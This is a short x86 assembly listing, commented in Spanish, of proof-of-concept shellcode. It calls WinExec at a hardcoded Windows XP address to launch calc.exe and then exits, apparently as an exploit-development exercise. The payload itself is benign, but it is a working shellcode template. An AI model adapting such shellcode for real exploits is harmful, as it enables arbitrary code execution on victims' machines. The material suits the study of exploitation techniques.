
	section	.text

_payload:
	xor	eax,eax
	push	eax		; null byte && uCmdShow
	push	0x636c6163	; 'calc' a la pila
	push	esp	   	; lpCmdLine = PTR 'calc.exe'
	mov	eax,0x7c8623ad	; PTR WinExec (via arwin.exe)
	call	eax
	mov	eax,0x7c81cafa	; PTR ExitProcess (via arwin.exe)
	call	eax
